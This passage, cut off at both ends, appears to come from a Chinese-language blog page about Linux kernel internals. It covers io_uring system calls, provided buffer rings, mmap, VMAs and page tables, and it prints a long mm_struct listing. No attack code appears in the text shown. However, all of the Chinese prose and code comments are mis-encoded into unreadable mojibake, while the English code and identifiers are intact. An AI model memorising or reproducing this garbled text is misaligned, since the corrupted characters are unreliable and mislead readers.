é€’é”™è¯¯ä¿¡æ¯ã€‚ç›¸åï¼Œreså°†åŒ…å«åœ¨æˆåŠŸçš„æƒ…å†µä¸‹ç­‰æ•ˆç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›çš„å†…å®¹ï¼Œåœ¨é”™è¯¯çš„æƒ…å†µä¸‹reså°†åŒ…å«-errnoã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ­£å¸¸çš„è¯»å–ç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›-1å¹¶è®¾ç½®errnoä¸ºEINVALï¼Œé‚£ä¹ˆreså°†åŒ…å«-EINVALã€‚å¦‚æœæ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›è¯»å–å¤§å°ä¸º1024ï¼Œé‚£ä¹ˆreså°†åŒ…å«1024ã€‚</p></li><li><p>å¯é€‰åœ°ï¼Œio_uring_enter(2) è¿˜å¯ä»¥åœ¨è¿”å›ä¹‹å‰ç­‰å¾…å†…æ ¸å¤„ç†æŒ‡å®šæ•°é‡çš„è¯·æ±‚ã€‚å¦‚æœä½ æŒ‡å®šäº†è¦ç­‰å¾…çš„å®Œæˆæ•°ï¼Œå†…æ ¸ä¼šåœ¨CQä¸Šæ”¾ç½®è‡³å°‘é‚£ä¹ˆå¤šçš„CQEsï¼Œä½ å¯ä»¥åœ¨io_uring_enter(2)è¿”å›åç«‹å³è¯»å–è¿™äº›CQEsã€‚</p></li><li><p>å†…æ ¸å¯ä»¥ä»¥ä»»æ„é¡ºåºå®ŒæˆSQä¸­å­˜åœ¨çš„I&#x2F;Oè¯·æ±‚</p></li></ul><h5 id="io-uring-register"><a href="#io-uring-register" class="headerlink" title="io_uring_register()"></a><code>io_uring_register()</code></h5><p>io_uring_register(2) ç³»ç»Ÿè°ƒç”¨æ³¨å†Œèµ„æºï¼ˆä¾‹å¦‚ï¼Œç”¨æˆ·ç¼“å†²åŒºã€æ–‡ä»¶ã€eventfdã€ä¸ªæ€§ã€é™åˆ¶ï¼‰ä»¥ä¾›é€šè¿‡ fd æŒ‡å¼•ç”¨çš„ io_uring(7) å®ä¾‹ä½¿ç”¨ã€‚æ³¨å†Œæ–‡ä»¶æˆ–ç”¨æˆ·ç¼“å†²åŒºå…è®¸å†…æ ¸å¯¹å†…éƒ¨æ•°æ®ç»“æ„è¿›è¡Œé•¿æœŸå¼•ç”¨æˆ–åˆ›å»ºåº”ç”¨ç¨‹åºå†…å­˜çš„é•¿æœŸæ˜ å°„ï¼Œä»è€Œå¤§å¤§å‡å°‘æ¯ä¸ª I&#x2F;O çš„å¼€é”€ã€‚</p><h5 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter()"></a><code>io_uring_enter()</code></h5><p>io_uring_enter(2)ç”¨äºé€šè¿‡io_uring_setup(2)è°ƒç”¨è®¾ç½®çš„å…±äº«æäº¤å’Œå®Œæˆé˜Ÿåˆ—æ¥å¯åŠ¨å’Œå®ŒæˆI&#x2F;Oã€‚å•ä¸ªè°ƒç”¨æ—¢å¯ä»¥æäº¤æ–°çš„I&#x2F;Oï¼Œä¹Ÿå¯ä»¥ç­‰å¾…ç”±è¯¥è°ƒç”¨æˆ–ä¹‹å‰çš„io_uring_enter(2)è°ƒç”¨å¯åŠ¨çš„I&#x2F;Oçš„å®Œæˆã€‚</p><h5 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup()"></a><code>io_uring_setup()</code></h5><p>io_uring_setup(2) ç³»ç»Ÿè°ƒç”¨è®¾ç½®äº†ä¸€ä¸ªè‡³å°‘åŒ…å«æ¡ç›®çš„æäº¤é˜Ÿåˆ—ï¼ˆSQï¼‰å’Œå®Œæˆé˜Ÿåˆ—ï¼ˆCQï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¯¥æè¿°ç¬¦å¯ç”¨äºåœ¨ io_uring å®ä¾‹ä¸Šæ‰§è¡Œåç»­æ“ä½œã€‚æäº¤é˜Ÿåˆ—å’Œå®Œæˆé˜Ÿåˆ—åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ä¹‹é—´å…±äº«ï¼Œä»è€Œæ¶ˆé™¤äº†åœ¨å¯åŠ¨å’Œå®Œæˆ I&#x2F;O æ—¶å¤åˆ¶æ•°æ®çš„éœ€æ±‚ã€‚</p><h5 id="pbufå’Œring-buf"><a href="#pbufå’Œring-buf" class="headerlink" title="pbufå’Œring_buf"></a><code>pbuf</code>å’Œ<code>ring_buf</code></h5><p><code>pbuf</code>æ˜¯æä¾›å¼ç¼“å†²åŒºï¼Œå…·ä½“è°ƒç”¨é“¾ä¸ºï¼š<br><code>io_uring_register() -&gt; __io_uring_register() -&gt; io_register_pbuf_ring()</code><br>åå‘ç®¡ç†ã€‚ç”¨æˆ·é¢„å…ˆæŠŠå¯ç”¨äºæ¥æ”¶æ•°æ®çš„ä¸€æ‰¹ buffer æ”¾åˆ° <strong>buffer ring</strong>ï¼›å½“æŸä¸ªè¯»ç±»è¯·æ±‚å¸¦ IOSQE_BUFFER_SELECT æ—¶ï¼Œå†…æ ¸<strong>ä» ring é‡ŒæŒ‘ä¸€ä¸ª</strong>å¯ç”¨ç¼“å†²åŒºæ¥å†™å…¥æ•°æ®ï¼Œç”Ÿå‘½å‘¨æœŸæ¸…æ™°ä¸”é«˜æ•ˆã€‚</p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a></h3><p>ä¸€ä¸ªè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸»è¦ç”±ä¸¤ä¸ªæ•°æ®ç»“æ¥æè¿°ã€‚ä¸€ä¸ªæ˜¯æœ€é«˜å±‚æ¬¡çš„ï¼šmm_structï¼Œä¸€ä¸ªæ˜¯è¾ƒé«˜å±‚æ¬¡çš„ï¼švm_area_structsã€‚æœ€é«˜å±‚æ¬¡çš„mm_structç»“æ„æè¿°äº†ä¸€ä¸ªè¿›ç¨‹çš„æ•´ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´ã€‚è¾ƒé«˜å±‚æ¬¡çš„ç»“æ„vm_area_tructæè¿°äº†è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€ä¸ªåŒºé—´ï¼ˆç®€ç§°è™šæ‹ŸåŒºï¼‰ã€‚æ¯ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªmm_structç»“æ„ï¼Œåœ¨æ¯ä¸ªè¿›ç¨‹çš„task_structç»“æ„ä¸­ï¼Œæœ‰ä¸€ä¸ªæŒ‡å‘è¯¥è¿›ç¨‹çš„ç»“æ„ã€‚å¯ä»¥è¯´ï¼Œmm_structç»“æ„æ˜¯å¯¹æ•´ä¸ªç”¨æˆ·ç©ºé—´çš„æè¿°ã€‚å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/qq_26768741/article/details/54375524">æ–‡æ¡£</a></p><h5 id="1-mmap-çš„æ€»ä½“æµç¨‹ï¼ˆä»ç”¨æˆ·åˆ°å†…æ ¸çš„â€œç™»è®°â€è¿‡ç¨‹"><a href="#1-mmap-çš„æ€»ä½“æµç¨‹ï¼ˆä»ç”¨æˆ·åˆ°å†…æ ¸çš„â€œç™»è®°â€è¿‡ç¨‹" class="headerlink" title="1) mmap çš„æ€»ä½“æµç¨‹ï¼ˆä»ç”¨æˆ·åˆ°å†…æ ¸çš„â€œç™»è®°â€è¿‡ç¨‹"></a>1) mmap çš„æ€»ä½“æµç¨‹ï¼ˆä»ç”¨æˆ·åˆ°å†…æ ¸çš„â€œç™»è®°â€è¿‡ç¨‹</h5><ol><li><p>ç”¨æˆ·æ€è°ƒç”¨ <code>mmap()</code>ï¼ˆæˆ– <code>mmap64</code>ï¼‰ï¼šä¼ å…¥èµ·å§‹åœ°å€&#x2F;é•¿åº¦&#x2F;æƒé™&#x2F;æ ‡å¿—ï¼ˆ<code>MAP_SHARED/MAP_PRIVATE/MAP_ANONYMOUS/MAP_FIXED</code> ç­‰ï¼‰ä»¥åŠå¯èƒ½çš„ <code>fd/offset</code>ã€‚</p></li><li><p>å†…æ ¸å¤„ç† <code>mmap</code> ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€ç»ˆåœ¨è¿›ç¨‹çš„ <code>mm_struct</code> ä¸­åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ª <code>vm_area_structï¼ˆVMAï¼‰</code>ï¼Œæ¯ä¸ª VMA æè¿°ä¸€ä¸ªâ€œè™šæ‹Ÿåœ°å€åŒºé—´â€åŠå…¶å±æ€§ï¼ˆèµ·å§‹&#x2F;ç»“æŸåœ°å€ã€æƒé™ã€ä¸æ–‡ä»¶çš„å…³è”ç­‰ï¼‰ã€‚æ–‡æ¡£æŠŠ VMA æè¿°ä¸ºâ€œè·Ÿè¸ªç”¨æˆ·ç©ºé—´è¿ç»­è™šæ‹ŸåŒºé—´â€çš„å¯¹è±¡ã€‚</p></li><li><p>VMA åªæ˜¯<strong>å…ƒä¿¡æ¯</strong>ï¼ˆæè¿°å±æ€§å’ŒèŒƒå›´ï¼‰ï¼Œå®ƒæœ¬èº«å¹¶ä¸ç›´æ¥å«æœ‰ç‰©ç†é¡µé¢ã€‚çœŸæ­£æŠŠè™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†é¡µçš„ï¼Œæ˜¯é¡µè¡¨ï¼ˆpage tablesï¼‰â€”â€”è¿™äº›æ¡ç›®ï¼ˆPTEï¼‰ç”±å†…æ ¸åœ¨<strong>åç»­é˜¶æ®µ</strong>å¡«å…¥ï¼Œé€šå¸¸åœ¨ç¼ºé¡µå¼‚å¸¸(page fault)æ—¶æˆ–é€šè¿‡é©±åŠ¨&#x2F;å†…æ ¸æ˜¾å¼æ˜ å°„å‡½æ•°ï¼ˆå¦‚ <code>remap_pfn_range()ã€vm_insert_page()ã€vm_insert_pages()</code>ï¼‰æ—¶å»ºç«‹ã€‚</p></li></ol><p>ç®€è¨€ä¹‹ï¼š</p><ul><li><p>mmap() â†’ åˆ›å»º <code>VMAï¼ˆvm_area_structï¼‰</code>å¹¶ç™»è®°åœ¨ <code>mm_struct</code> ä¸­ï¼ˆé€»è¾‘å±‚ï¼‰ã€‚</p></li><li><p>PTEï¼ˆé¡µè¡¨é¡¹ï¼‰å†³å®šè™šæ‹Ÿåœ°å€èƒ½å¦å®é™…è®¿å­˜ä»¥åŠæŒ‡å‘å“ªä¸ªç‰©ç†å¸§ï¼ˆç‰©ç† PFNï¼‰ã€‚PTE çš„å»ºç«‹å¯ä»¥æ˜¯â€œæ‡’æƒ°â€ï¼ˆfault-on-accessï¼‰æˆ–è€…â€œå³æ—¶â€ï¼ˆå†…æ ¸ç›´æ¥æ’å…¥ PTEï¼‰ã€‚</p></li></ul><p>å¯ä»¥å‚è€ƒ<a href="https://docs.kernel.org/mm/process_addrs.html?utm_source=chatgpt.com">æ–‡æ¡£</a></p><h5 id="2-ä»€ä¹ˆæ˜¯vm-area-struct-VMAï¼‰"><a href="#2-ä»€ä¹ˆæ˜¯vm-area-struct-VMAï¼‰" class="headerlink" title="2) ä»€ä¹ˆæ˜¯vm_area_struct(VMAï¼‰"></a>2) ä»€ä¹ˆæ˜¯vm_area_struct(VMAï¼‰</h5><p>struct vm_area_structï¼ˆç®€ç§° VMAï¼‰æ˜¯å†…æ ¸ç”¨æ¥è¡¨ç¤ºâ€œè¿ç»­ã€å±æ€§ç›¸åŒçš„ç”¨æˆ·è™šæ‹Ÿåœ°å€åŒºåŸŸâ€çš„ç»“æ„ä½“ã€‚ä¸»è¦å…³é”®ä¿¡æ¯ï¼š</p><ul><li><p><code>vm_start, vm_end</code>ï¼šè¯¥ VMA çš„è™šæ‹Ÿåœ°å€åŒºé—´ï¼ˆ[start, end)ï¼‰ã€‚</p></li><li><p><code>vm_flags</code>ï¼šè¯»&#x2F;å†™&#x2F;æ‰§è¡Œç­‰æƒé™ä½ï¼ˆå¹¶å½±å“ fault æ—¶æ˜¯å¦å…è®¸å†™ï¼‰ã€‚</p></li><li><p><code>vm_page_prot</code>ï¼šé¡µé¢ä¿æŠ¤å±æ€§ï¼ˆpgprotï¼‰ï¼Œç”¨äºæ’å…¥ PTE æ—¶è®¾ç½®è®¿é—®ä½&#x2F;ç¼“å­˜å±æ€§ç­‰ã€‚</p></li><li><p><code>vm_file / vm_pgoff</code>ï¼šè‹¥æ˜¯ file-backed æ˜ å°„ï¼Œè¿™é‡Œä¿å­˜æ–‡ä»¶å¯¹è±¡å’Œåç§»ã€‚</p></li><li><p><code>vm_ops</code>ï¼šå¦‚æœéœ€è¦ç‰¹æ®Š fault å¤„ç†æˆ–è¿ç§»ï¼Œè¿™é‡Œå¯ä»¥æŒ‡å®š VMA çš„æ“ä½œå‡½æ•°ï¼ˆå¦‚ fault å›è°ƒï¼‰ã€‚</p></li><li><p><code>vm_next</code> ç­‰ï¼šVMA é“¾è¡¨&#x2F;çº¢é»‘æ ‘ä¸­ç”¨äºè¿æ¥åŒä¸€è¿›ç¨‹çš„æ‰€æœ‰ VMAã€‚</p></li></ul><p><code>VMA</code> ä»£è¡¨â€œè¿™æ®µè™šæ‹Ÿåœ°å€åº”è¯¥æ€æ ·è¡¨ç°â€ï¼Œä½†å®ƒæœ¬èº«ä¸æ˜¯ç‰©ç†é¡µã€‚å®é™…çš„æ•°æ®æ¥è‡ª page cacheã€åŒ¿åé¡µï¼Œæˆ–å†…æ ¸&#x2F;è®¾å¤‡é€šè¿‡æ˜¾å¼æ˜ å°„æ’å…¥çš„ PTEã€‚</p><h5 id="3-ä»€ä¹ˆæ˜¯mm-struct"><a href="#3-ä»€ä¹ˆæ˜¯mm-struct" class="headerlink" title="3)ä»€ä¹ˆæ˜¯mm_struct"></a>3)ä»€ä¹ˆæ˜¯<code>mm_struct</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><br>    <span class="hljs-comment">//æŒ‡å‘çº¿æ€§åŒºå¯¹è±¡çš„é“¾è¡¨å¤´</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> * <span class="hljs-title">mmap</span>;</span>       <span class="hljs-comment">/* list of VMAs */</span><br>    <span class="hljs-comment">//æŒ‡å‘çº¿æ€§åŒºå¯¹è±¡çš„çº¢é»‘æ ‘</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root</span> <span class="hljs-title">mm_rb</span>;</span><br>    <span class="hljs-comment">//æŒ‡å‘æœ€è¿‘æ‰¾åˆ°çš„è™šæ‹ŸåŒºé—´</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> * <span class="hljs-title">mmap_cache</span>;</span> <span class="hljs-comment">/* last find_vma result */</span><br><br>    <span class="hljs-comment">//ç”¨æ¥åœ¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­æœç´¢æœ‰æ•ˆçš„è¿›ç¨‹åœ°å€ç©ºé—´çš„å‡½æ•°</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-title function_">long</span> <span class="hljs-params">(*get_unmapped_area)</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span>;<br><br>       <span class="hljs-type">unsigned</span> <span class="hljs-title function_">long</span> <span class="hljs-params">(*get_unmapped_exec_area)</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span>;<br><br>    <span class="hljs-comment">//é‡Šæ”¾çº¿æ€§åŒºæ—¶è°ƒç”¨çš„æ–¹æ³•ï¼Œ          </span><br>    <span class="hljs-type">void</span> (*unmap_area) (<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr);<br><br>    <span class="hljs-comment">//æ ‡è¯†ç¬¬ä¸€ä¸ªåˆ†é…æ–‡ä»¶å†…å­˜æ˜ å°„çš„çº¿æ€§åœ°å€</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mmap_base;        <span class="hljs-comment">/* base of mmap area */</span><br><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> task_size;        <span class="hljs-comment">/* size of task vm space */</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * RHEL6 special for bug 790921: this same variable can mean</span><br><span class="hljs-comment">     * two different things. If sysctl_unmap_area_factor is zero,</span><br><span class="hljs-comment">     * this means the largest hole below free_area_cache. If the</span><br><span class="hljs-comment">     * sysctl is set to a positive value, this variable is used</span><br><span class="hljs-comment">     * to count how much memory has been munmapped from this process</span><br><span class="hljs-comment">     * since the last time free_area_cache was reset back to mmap_base.</span><br><span class="hljs-comment">     * This is ugly, but necessary to preserve kABI.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cached_hole_size;<br><br>    <span class="hljs-comment">//å†…æ ¸è¿›ç¨‹æœç´¢è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çº¿æ€§åœ°å€çš„ç©ºé—´ç©ºé—´</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_area_cache;      <span class="hljs-comment">/* first hole of size cached_hole_size or larger */</span><br><br>    <span class="hljs-comment">//æŒ‡å‘é¡µè¡¨çš„ç›®å½•</span><br>    <span class="hljs-type">pgd_t</span> * pgd;<br><br>    <span class="hljs-comment">//å…±äº«è¿›ç¨‹æ—¶çš„ä¸ªæ•°</span><br>    <span class="hljs-type">atomic_t</span> mm_users;          <span class="hljs-comment">/* How many users with user space? */</span><br><br>    <span class="hljs-comment">//å†…å­˜æè¿°ç¬¦çš„ä¸»ä½¿ç”¨è®¡æ•°å™¨ï¼Œé‡‡ç”¨å¼•ç”¨è®¡æ•°çš„åŸç†ï¼Œå½“ä¸º0æ—¶ä»£è¡¨æ— ç”¨æˆ·å†æ¬¡ä½¿ç”¨</span><br>    <span class="hljs-type">atomic_t</span> mm_count;          <span class="hljs-comment">/* How many references to &quot;struct mm_struct&quot; (users count as 1) */</span><br><br>    <span class="hljs-comment">//çº¿æ€§åŒºçš„ä¸ªæ•°</span><br>    <span class="hljs-type">int</span> map_count;              <span class="hljs-comment">/* number of VMAs */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">mmap_sem</span>;</span><br><br>    <span class="hljs-comment">//ä¿æŠ¤ä»»åŠ¡é¡µè¡¨å’Œå¼•ç”¨è®¡æ•°çš„é”</span><br>    <span class="hljs-type">spinlock_t</span> page_table_lock;     <span class="hljs-comment">/* Protects page tables and some counters */</span><br><br>    <span class="hljs-comment">//mm_structç»“æ„ï¼Œç¬¬ä¸€ä¸ªæˆå‘˜å°±æ˜¯åˆå§‹åŒ–çš„mm_structç»“æ„ï¼Œ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">mmlist</span>;</span>        <span class="hljs-comment">/* List of maybe swapped mm&#x27;s.  These are globally strung</span><br><span class="hljs-comment">                         * together off init_mm.mmlist, and are protected</span><br><span class="hljs-comment">                         * by mmlist_lock</span><br><span class="hljs-comment">                         */</span><br><br>    <span class="hljs-comment">/* Special counters, in some configurations protected by the</span><br><span class="hljs-comment">     * page_table_lock, in other configurations by being atomic.</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-type">mm_counter_t</span> _file_rss;<br>    <span class="hljs-type">mm_counter_t</span> _anon_rss;<br>    <span class="hljs-type">mm_counter_t</span> _swap_usage;<br><br>    <span class="hljs-comment">//è¿›ç¨‹æ‹¥æœ‰çš„æœ€å¤§é¡µè¡¨æ•°ç›®</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hiwater_rss;  <span class="hljs-comment">/* High-watermark of RSS usage */</span>ã€<br>    <span class="hljs-comment">//è¿›ç¨‹çº¿æ€§åŒºçš„æœ€å¤§é¡µè¡¨æ•°ç›®</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hiwater_vm;   <span class="hljs-comment">/* High-water virtual memory usage */</span><br><br>    <span class="hljs-comment">//è¿›ç¨‹åœ°å€ç©ºé—´çš„å¤§å°ï¼Œé”ä½æ— æ³•æ¢é¡µçš„ä¸ªæ•°ï¼Œå…±äº«æ–‡ä»¶å†…å­˜æ˜ å°„çš„é¡µæ•°ï¼Œå¯æ‰§è¡Œå†…å­˜æ˜ å°„ä¸­çš„é¡µæ•°</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_vm, locked_vm, shared_vm, exec_vm;<br>    <span class="hljs-comment">//ç”¨æˆ·æ€å †æ ˆçš„é¡µæ•°ï¼Œ</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;<br>    <span class="hljs-comment">//ç»´æŠ¤ä»£ç æ®µå’Œæ•°æ®æ®µ</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code, end_code, start_data, end_data;<br>    <span class="hljs-comment">//ç»´æŠ¤å †å’Œæ ˆ</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_brk, brk, start_stack;<br>    <span class="hljs-comment">//ç»´æŠ¤å‘½ä»¤è¡Œå‚æ•°ï¼Œå‘½ä»¤è¡Œå‚æ•°çš„èµ·å§‹åœ°å€å’Œæœ€ååœ°å€ï¼Œä»¥åŠç¯å¢ƒå˜é‡çš„èµ·å§‹åœ°å€å’Œæœ€ååœ°å€</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg_start, arg_end, env_start, env_end;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="hljs-comment">/* for /proc/PID/auxv */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_binfmt</span> *<span class="hljs-title">binfmt</span>;</span><br><br>    <span class="hljs-type">cpumask_t</span> cpu_vm_mask;<br><br>    <span class="hljs-comment">/* Architecture-specific MM context */</span><br>    <span class="hljs-type">mm_context_t</span> context;<br><br>    <span class="hljs-comment">/* Swap token stuff */</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Last value of global fault stamp as seen by this process.</span><br><span class="hljs-comment">     * In other words, this value gives an indication of how long</span><br><span class="hljs-comment">     * it has been since this task got the token.</span><br><span class="hljs-comment">     * Look at mm/thrash.c</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> faultstamp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> token_priority;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> last_interval;<br><br>    <span class="hljs-comment">//çº¿æ€§åŒºçš„é»˜è®¤è®¿é—®æ ‡å¿—</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags; <span class="hljs-comment">/* Must use atomic bitops to access the bits */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">core_state</span> *<span class="hljs-title">core_state</span>;</span> <span class="hljs-comment">/* coredumping support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_AIO</span><br>    <span class="hljs-type">spinlock_t</span>      ioctx_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span>   <span class="hljs-title">ioctx_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MM_OWNER</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span><br><span class="hljs-comment">     * user/owner of this mm. All of the following must be true in</span><br><span class="hljs-comment">     * order for it to be changed:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * current == mm-&gt;owner</span><br><span class="hljs-comment">     * current-&gt;mm != mm</span><br><span class="hljs-comment">     * new_owner-&gt;mm == mm</span><br><span class="hljs-comment">     * new_owner-&gt;alloc_lock is held</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">owner</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PROC_FS</span><br>    <span class="hljs-comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">exe_file</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> num_exe_file_vmas;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mmu_notifier_mm</span> *<span class="hljs-title">mmu_notifier_mm</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span><br>    <span class="hljs-type">pgtable_t</span> pmd_huge_pte; <span class="hljs-comment">/* protected by page_table_lock */</span><br><span class="hljs-meta">#<span 